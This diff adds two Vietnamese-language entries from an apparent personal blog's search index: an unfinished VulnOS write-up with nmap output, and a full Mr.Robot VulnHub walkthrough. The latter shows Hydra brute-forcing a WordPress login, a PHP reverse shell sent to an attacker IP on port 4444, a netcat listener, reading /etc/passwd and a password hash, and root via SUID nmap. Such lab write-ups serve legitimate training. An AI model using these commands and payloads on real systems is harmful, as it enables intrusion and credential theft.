@@ -1643,4 +1643,257 @@ Nmap done: 1 IP address (1 host up) scanned in 4.56 seconds<span aria-hidden="tr
         <tag>htb</tag>
       </tags>
   </entry>
+  <entry>
+    <title>vulnos-vulnhub</title>
+    <url>/2021/02/01/vulnos-vulnhub/</url>
+    <content><![CDATA[<p>Writing…</p>
+<a id="more"></a>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">nmap -sn -v 10.10.10.102-105
+Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-02-03 15:39 +07
+Initiating Ping Scan at 15:39
+Scanning 4 hosts [2 ports&#x2F;host]
+Completed Ping Scan at 15:39, 1.20s elapsed (4 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 15:39
+Completed Parallel DNS resolution of 1 host. at 15:39, 0.04s elapsed
+Nmap scan report for 10.10.10.102 [host down]
+Nmap scan report for 10.10.10.103
+Host is up (0.00058s latency).
+Nmap scan report for 10.10.10.104 [host down]
+Nmap scan report for 10.10.10.105 [host down]
+Read data files from: &#x2F;usr&#x2F;bin&#x2F;..&#x2F;share&#x2F;nmap<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">nmap -p- 10.10.10.103 --min-rate 3000
+Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-02-03 15:39 +07
+Nmap scan report for 10.10.10.103
+Host is up (0.00013s latency).
+Not shown: 65532 closed ports
+PORT     STATE SERVICE
+22&#x2F;tcp   open  ssh
+80&#x2F;tcp   open  http
+6667&#x2F;tcp open  irc
+
+Nmap done: 1 IP address (1 host up) scanned in 1.05 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">nmap -p 22,80,6667 -A 10.10.10.103   
+Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-02-03 15:41 +07
+Nmap scan report for 10.10.10.103
+Host is up (0.00064s latency).
+
+PORT     STATE SERVICE VERSION
+22&#x2F;tcp   open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.6 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   1024 f5:4d:c8:e7:8b:c1:b2:11:95:24:fd:0e:4c:3c:3b:3b (DSA)
+|   2048 ff:19:33:7a:c1:ee:b5:d0:dc:66:51:da:f0:6e:fc:48 (RSA)
+|   256 ae:d7:6f:cc:ed:4a:82:8b:e8:66:a5:11:7a:11:5f:86 (ECDSA)
+|_  256 71:bc:6b:7b:56:02:a4:8e:ce:1c:8e:a6:1e:3a:37:94 (ED25519)
+80&#x2F;tcp   open  http    Apache httpd 2.4.7 ((Ubuntu))
+|_http-server-header: Apache&#x2F;2.4.7 (Ubuntu)
+|_http-title: VulnOSv2
+6667&#x2F;tcp open  irc     ngircd
+Service Info: Host: irc.example.net; OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .
+Nmap done: 1 IP address (1 host up) scanned in 18.66 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">available databases [6]:
+[*] drupal7
+[*] information_schema
+[*] jabcd0cs
+[*] mysql
+[*] performance_schema
+[*] phpmyadmin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
+  </entry>
+  <entry>
+    <title>[VulnHub] Mr.Robot</title>
+    <url>/2021/02/03/mrrobot-vulnhub/</url>
+    <content><![CDATA[<h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>Link download: <a href="https://www.vulnhub.com/entry/mr-robot-1,151/">MR-ROBOT: 1</a><br>Difficulty: <em>Chả biết, nhưng chắc là dễ…</em></p>
+<a id="more"></a>
+<h2 id="Information-Gathering"><a href="#Information-Gathering" class="headerlink" title="Information Gathering"></a>Information Gathering</h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><p>Lại là mấy cái lệnh cửa miệng với mấy bài boot2root trên Vulnhub… bla bla bla…</p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ nmap -sn 10.10.10.101-105       
+Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-02-03 10:25 +07
+Nmap scan report for 10.10.10.101 (10.10.10.101)
+Host is up (0.00011s latency).
+Nmap scan report for 10.10.10.102
+Host is up (0.00045s latency).
+
+Nmap done: 5 IP addresses (2 hosts up) scanned in 1.26 seconds
+
+$ nmap -p- 10.10.10.102 --min-rate 3000
+Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-02-03 10:26 +07
+Nmap scan report for 10.10.10.102 (10.10.10.102)
+Host is up (0.00020s latency).
+Not shown: 65532 filtered ports
+PORT    STATE  SERVICE
+22&#x2F;tcp  closed ssh
+80&#x2F;tcp  open   http
+443&#x2F;tcp open   https
+
+Nmap done: 1 IP address (1 host up) scanned in 43.87 seconds
+
+$ nmap -p 22,80,443 -sC -sV 10.10.10.102
+Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-02-03 10:28 +07
+Nmap scan report for 10.10.10.102 (10.10.10.102)
+Host is up (0.00060s latency).
+
+PORT    STATE  SERVICE  VERSION
+22&#x2F;tcp  closed ssh
+80&#x2F;tcp  open   http     Apache httpd
+|_http-server-header: Apache
+|_http-title: Site doesn&#39;t have a title (text&#x2F;html).
+443&#x2F;tcp open   ssl&#x2F;http Apache httpd
+|_http-server-header: Apache
+|_http-title: Site doesn&#39;t have a title (text&#x2F;html).
+| ssl-cert: Subject: commonName&#x3D;www.example.com
+| Not valid before: 2015-09-16T10:45:03
+|_Not valid after:  2025-09-13T10:45:03
+
+Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .
+Nmap done: 1 IP address (1 host up) scanned in 14.22 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>Vậy là bài này đang mở 3 cổng TCP là 22, 80, và 443. Mô hình chung là sẽ đánh vào một lỗi nào đó trên web server cổng 80/443 và cướp shell, leo quyền… chứ không lằng nhằng đến các service khác.<br><img src="1.png"><br>Okay, Dirsearch nó xem nào.</p>
+<h3 id="Dirsearch"><a href="#Dirsearch" class="headerlink" title="Dirsearch"></a>Dirsearch</h3><p>Kết quả dưới đây đã lọc hết các response có status khác 200, cho dễ nhìn. Nếu vẫn còn khó nhìn, thì tôi khuyên bạn nên dành mấy phút nghỉ ngơi xem pỏn giải trí đi.</p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">[10:29:58] Starting: cookies.js
+[10:31:08] 200 -    1KB - &#x2F;admin&#x2F;
+[10:31:08] 200 -    1KB - &#x2F;admin&#x2F;?&#x2F;login
+[10:31:10] 200 -    1KB - &#x2F;admin&#x2F;index
+[10:31:10] 200 -    1KB - &#x2F;admin&#x2F;index.html
+[10:32:26] 200 -    0B  - &#x2F;favicon.ico
+[10:32:38] 200 -    1KB - &#x2F;index.html
+[10:32:41] 200 -  504KB - &#x2F;intro
+[10:32:47] 200 -  309B  - &#x2F;license
+[10:32:47] 200 -  309B  - &#x2F;license.txt
+[10:33:27] 200 -   64B  - &#x2F;readme
+[10:33:27] 200 -   64B  - &#x2F;readme.html
+[10:33:30] 200 -   41B  - &#x2F;robots.txt
+[10:33:40] 200 -    0B  - &#x2F;sitemap
+[10:33:40] 200 -    0B  - &#x2F;sitemap.xml
+[10:33:40] 200 -    0B  - &#x2F;sitemap.xml.gzhttp:&#x2F;&#x2F;10.10.10.102&#x2F;sugarcrm&#x2F;?module&#x3D;Accounts&amp;action&#x3D;ShowDuplicateshttp:&#x2F;&#x2F;10.10.10.102&#x2F;sugarcrm&#x2F;?module&#x3D;Contacts&amp;action&#x3D;ShowDuplicates%20
+[10:34:07] 200 -    1B  - &#x2F;wp-admin&#x2F;admin-ajax.php
+[10:34:07] 500 -    3KB - &#x2F;wp-admin&#x2F;setup-config.php
+[10:34:07] 200 -    0B  - &#x2F;wp-config.php
+[10:34:07] 200 -    0B  - &#x2F;wp-content&#x2F;
+[10:34:08] 500 -    0B  - &#x2F;wp-content&#x2F;plugins&#x2F;hello.php
+[10:34:08] 200 -    0B  - &#x2F;wp-content&#x2F;plugins&#x2F;google-sitemap-generator&#x2F;sitemap-core.php
+[10:34:08] 200 -    0B  - &#x2F;wp-cron.php
+[10:34:08] 200 -    3KB - &#x2F;wp-login.php
+[10:34:08] 200 -    3KB - &#x2F;wp-login
+[10:34:08] 200 -    3KB - &#x2F;wp-login&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>Có thể thấy ngay web server này sử dụng nền tảng Wordpress để xây dựng nội dung.<br>Kệ bà nó cái đã, vòng qua một vòng cái đống này xem nào.<br>Có cái này hay ho…<br><a href="http://10.10.10.102/robots.txt">http://10.10.10.102/robots.txt</a></p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">User-agent: *
+fsocity.dic
+key-1-of-3.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p><a href="http://10.10.10.102/key-1-of-3.txt">http://10.10.10.102/key-1-of-3.txt</a></p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">073403c8a58a1f80d943455fb30724b9<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>Đây là một flag mà đề bài yêu cầu tìm, không liên quan gì đến việc khai thác lỗi của bài.<br>Và một file nữa (<a href="http://10.10.10.102/fsocity.dic">http://10.10.10.102/fsocity.dic</a>), nhìn là biết đây là một wordlist, tác giả đang muốn chúng ta sử dụng nó để tấn công brute-force ở một phần nào đó trong bài.<br><img src="5.png"><br>Đúng rồi đấy :D chỉ còn ở đây chứ còn ở đâu nữa. Thật ra vẫn còn chỗ nữa để brute-force đấy là cổng 22-SSH, cơ mà nếu brute-force thành công và lấy được SSH shell thì bài này quá ez, chả cần phải lần mò và web server để đào bới vấn đề.<br>Theo cái lối suy nghĩ cổ hủ và bảo thủ ấy, tôi quyết định brute-force trang login của Wordpress.<br>Đầu tiên là mò username. Wordpress có một cái sự ngớ ngẩn khi thông báo Login không thành công. Khi login với username không tồn tại trong hệ thống, nó sẽ trổ luôn ra một câu <em>Invalid user!</em>. Dafuk? Và nếu username có tồn tại trong hệ thống, nhưng sai password, lúc này sẽ là một thông báo khác là <em>Incorrect password</em>.<br>Đây vừa có thể là một lỗi, vừa có thể là một tính năng. Cơ mà bây giờ để bảo mật, các trang login thường sẽ để một thông báo chung chung ví dụ như “Username hoặc password mày vừa nhập có vấn đề” hoặc ngắn gọn hơn là “Đăng nhập éo thành công!”. Còn như thằng Wordpress này ấy, cái lỗi ở đây khiến cho kẻ tấn công có thể dò tìm được username, và sau đó sẽ dò tiếp password tương ứng với username, sẽ đỡ thời gian brute-force hơn rất nhiều so với việc dò tìm cả 2 cái này cùng một lúc.<br>Trình bày dài dòng là như thế, giờ thì dò username thôi :))<br>Ném cái wordlist vừa tìm được vào option -L (List user) và option -p là duma (Mật khẩu tự chọn).</p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ hydra -L fsocity.dic -p duma 10.10.10.102 http-post-form &quot;&#x2F;wp-login.php:log&#x3D;^USER^&amp;pwd&#x3D;^PASS^:Invalid&quot;
+Hydra v9.1 (c) 2020 by van Hauser&#x2F;THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https:&#x2F;&#x2F;github.com&#x2F;vanhauser-thc&#x2F;thc-hydra) starting at 2021-02-03 10:49:37
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 858235 login tries (l:858235&#x2F;p:1), ~53640 tries per task
+[DATA] attacking http-post-form:&#x2F;&#x2F;10.10.10.102:80&#x2F;wp-login.php:log&#x3D;^USER^&amp;pwd&#x3D;^PASS^:Invalid
+[80][http-post-form] host: 10.10.10.102   login: Elliot   password: duma
+[80][http-post-form] host: 10.10.10.102   login: elliot   password: duma
+[STATUS] 2090.00 tries&#x2F;min, 2090 tries in 00:01h, 856145 to do in 06:50h, 16 active<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>Thế là tóm được thằng user Elloit/elliot, do không phân biệt chữ hoa và chữ thường.<br>Tiếp theo là dò mật khẩu của thằng Elliot, lần này đợi hơi lâu nên tôi quyết định treo máy đấy và đi chơi game.</p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ hydra -l elliot -P fsocity.dic 10.10.10.102 http-post-form &quot;&#x2F;wp-login.php:log&#x3D;^USER^&amp;pwd&#x3D;^PASS^:Invalid&quot;
+Hydra v9.1 (c) 2020 by van Hauser&#x2F;THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https:&#x2F;&#x2F;github.com&#x2F;vanhauser-thc&#x2F;thc-hydra) starting at 2021-02-03 10:52:31
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 858235 login tries (l:858235&#x2F;p:1), ~53640 tries per task
+[DATA] attacking http-post-form:&#x2F;&#x2F;10.10.10.102:80&#x2F;wp-login.php:log&#x3D;^USER^&amp;pwd&#x3D;^PASS^:Incorrect
+[80][http-post-form] host: 10.10.10.102   login: elliot   password: ER28-0652<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>Nghe ổn đấy, login vào xem nào.<br><img src="6.png"><br>Để ý thấy Elliot đang là admin của trang này, toẹt vời, điều đó có nghĩa là Elliot có thể sửa đổi mã nguồn của các page như 404, header, poster các thứ… Không cần đến Wpscan để quét, chèn một đoạn shell PHP vào bất kỳ page nào trong phần Editer, miễn là truy cập được là được.</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$sock</span> <span class="token operator">=</span> <span class="token function">fsockopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"10.10.10.101"</span><span class="token punctuation">,</span><span class="token number">4444</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$proc</span> <span class="token operator">=</span> <span class="token function">proc_open</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/bin/sh -i"</span><span class="token punctuation">,</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token operator">=></span><span class="token variable">$sock</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token operator">=></span><span class="token variable">$sock</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token operator">=></span><span class="token variable">$sock</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$pipes</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>Mở listen netcat trên port 4444 và lấy shell :))</p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ nc -klnvp 4444                        
+Ncat: Version 7.91 ( https:&#x2F;&#x2F;nmap.org&#x2F;ncat )
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 10.10.10.102.
+Ncat: Connection from 10.10.10.102:35666.
+&#x2F;bin&#x2F;sh: 0: can&#39;t access tty; job control turned off
+$ id
+uid&#x3D;1(daemon) gid&#x3D;1(daemon) groups&#x3D;1(daemon)
+
+$ ls -al
+total 16
+drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
+drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
+-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
+-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
+
+$ cat password.raw-md5
+robot:c3fcd3d76192e4007dfb496cca67e13b<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>Èn. Họ cho luôn mật khẩu hash của user robot này.<br><img src="7.png"><br><em>robot:abcdefghijklmnopqrstuvwxyz</em></p>
+<h2 id="Privileges-Escalation"><a href="#Privileges-Escalation" class="headerlink" title="Privileges Escalation"></a>Privileges Escalation</h2><p>Lấy PTY rồi chuyển sang phiên của user robot.</p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">robot@linux:~$ cat &#x2F;etc&#x2F;passwd
+root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash
+daemon:x:1:1:daemon:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;sbin&#x2F;nologin
+bin:x:2:2:bin:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin
+sys:x:3:3:sys:&#x2F;dev:&#x2F;usr&#x2F;sbin&#x2F;nologin
+sync:x:4:65534:sync:&#x2F;bin:&#x2F;bin&#x2F;sync
+games:x:5:60:games:&#x2F;usr&#x2F;games:&#x2F;usr&#x2F;sbin&#x2F;nologin
+man:x:6:12:man:&#x2F;var&#x2F;cache&#x2F;man:&#x2F;usr&#x2F;sbin&#x2F;nologin
+lp:x:7:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;usr&#x2F;sbin&#x2F;nologin
+mail:x:8:8:mail:&#x2F;var&#x2F;mail:&#x2F;usr&#x2F;sbin&#x2F;nologin
+news:x:9:9:news:&#x2F;var&#x2F;spool&#x2F;news:&#x2F;usr&#x2F;sbin&#x2F;nologin
+uucp:x:10:10:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;usr&#x2F;sbin&#x2F;nologin
+proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin
+www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin
+backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin
+list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin
+irc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin
+nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin
+libuuid:x:100:101::&#x2F;var&#x2F;lib&#x2F;libuuid:
+syslog:x:101:104::&#x2F;home&#x2F;syslog:&#x2F;bin&#x2F;false
+sshd:x:102:65534::&#x2F;var&#x2F;run&#x2F;sshd:&#x2F;usr&#x2F;sbin&#x2F;nologin
+ftp:x:103:106:ftp daemon,,,:&#x2F;srv&#x2F;ftp:&#x2F;bin&#x2F;false
+bitnamiftp:x:1000:1000::&#x2F;opt&#x2F;bitnami&#x2F;apps:&#x2F;bin&#x2F;bitnami_ftp_false
+mysql:x:1001:1001::&#x2F;home&#x2F;mysql:
+varnish:x:999:999::&#x2F;home&#x2F;varnish:
+robot:x:1002:1002::&#x2F;home&#x2F;robot:<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>Nothing to do here. Tìm kiếm binary SUID xem sao.</p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">robot@linux:~$ find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null
+find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null
+&#x2F;bin&#x2F;ping
+&#x2F;bin&#x2F;umount
+&#x2F;bin&#x2F;mount
+&#x2F;bin&#x2F;ping6
+&#x2F;bin&#x2F;su
+&#x2F;usr&#x2F;bin&#x2F;passwd
+&#x2F;usr&#x2F;bin&#x2F;newgrp
+&#x2F;usr&#x2F;bin&#x2F;chsh
+&#x2F;usr&#x2F;bin&#x2F;chfn
+&#x2F;usr&#x2F;bin&#x2F;gpasswd
+&#x2F;usr&#x2F;bin&#x2F;sudo
+&#x2F;usr&#x2F;local&#x2F;bin&#x2F;nmap
+&#x2F;usr&#x2F;lib&#x2F;openssh&#x2F;ssh-keysign
+&#x2F;usr&#x2F;lib&#x2F;eject&#x2F;dmcrypt-get-device
+&#x2F;usr&#x2F;lib&#x2F;vmware-tools&#x2F;bin32&#x2F;vmware-user-suid-wrapper
+&#x2F;usr&#x2F;lib&#x2F;vmware-tools&#x2F;bin64&#x2F;vmware-user-suid-wrapper
+&#x2F;usr&#x2F;lib&#x2F;pt_chown<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>Oay, có nmap kìa. Dễ rồi. (<a href="https://gtfobins.github.io/gtfobins/nmap/">https://gtfobins.github.io/gtfobins/nmap/</a>)</p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">robot@linux:~$ ls -al &#x2F;usr&#x2F;local&#x2F;bin&#x2F;nmap
+-rwsr-xr-x 1 root root 504736 Nov 13  2015 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;nmap
+robot@linux:~$ nmap --interactive
+nmap --interactive
+
+Starting nmap V. 3.81 ( http:&#x2F;&#x2F;www.insecure.org&#x2F;nmap&#x2F; )
+Welcome to Interactive Mode -- press h &lt;enter&gt; for help
+nmap&gt; !sh
+!sh
+# id
+uid&#x3D;1002(robot) gid&#x3D;1002(robot) euid&#x3D;0(root) groups&#x3D;0(root),1002(robot)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>SUID cho phép người dùng khác có thể chạy file với quyền của owner, trong trường hợp này là root.<br>Tại sao lại dùng !sh thay vì dùng !bash?<br>Lần đầu tôi cũng dùng !bash, kiểm tra thì thấy vẫn là user robot. Vậy là tôi bị mất thời gian để đi tìm kiếm những cách khác để leo root. Cơ mà sau một hồi google và để ý lại doc trên trang gtfobins, thấy cái này.</p>
+<blockquote>
+<p>SUID<br>If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (&lt;= Stretch) that allow the default sh shell to run with SUID privileges.<br>This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.</p>
+</blockquote>
+<p>Đuỵt moẹ! lại là câu chuyện của sh và bash và dash, xem ra Linux vẫn còn rất nhiều thứ cơ bản mà tôi cứ nghĩ là mình biết rồi…</p>
+]]></content>
+      <categories>
+        <category>VulnHub</category>
+      </categories>
+      <tags>
+        <tag>medium</tag>
+        <tag>vulnhub</tag>
+      </tags>
+  </entry>
 </search>
